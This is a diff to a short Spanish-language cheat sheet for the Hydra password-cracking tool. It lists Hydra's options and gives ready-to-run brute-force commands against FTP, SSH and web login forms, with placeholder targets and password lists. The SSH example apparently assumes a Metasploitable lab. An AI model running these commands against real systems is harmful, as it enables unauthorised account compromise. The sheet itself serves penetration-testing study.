@@ -1,6 +1,6 @@
 # Hydra Cheat Sheet
 
-### Options
+### Opciones
 
 - `-s <port>` : Si el servicio está en un puerto diferente por default.
 - `-l` : Especificar un usuario.
@@ -12,13 +12,19 @@
 - `-o <file>` : Guargar el resultado en un archivo.
 - `-vV` : Modo verbose, mostrando el inicio de sesión+contraseña para cada intento
 
-## Examples
+## Ejemplos
 
-### Brute Force Crack on FTP Server
-- `hydra -t 1 -l admin -P <path-to-password.lst> -vV <IPaddress> ftp`
+### Cracking con Brute Force en FTP Server
+```
+hydra -t 1 -l admin -P <path-to-password.lst> -vV <IPaddress> ftp
+```
 
-### Brute Force Crack on SSH Server
-- `hydra -l msfadmin -P <path-to-password.lst> ssh://IPaddress -vV`
+### Cracking con Brute Force en SSH Server
+```
+hydra -l msfadmin -P <path-to-password.lst> ssh://IPaddress -vV
+```
 
-### Brute Force Crack on WEB Login Server
-- `hydra -l none -P <path-to-password.lst> <IPaddress> https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password" -t 64 -V`
+### Cracking con Brute Force en WEB Login Server
+```
+hydra -l none -P <path-to-password.lst> <IPaddress> https-form-post "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:Incorrect password" -t 64 -V
+```
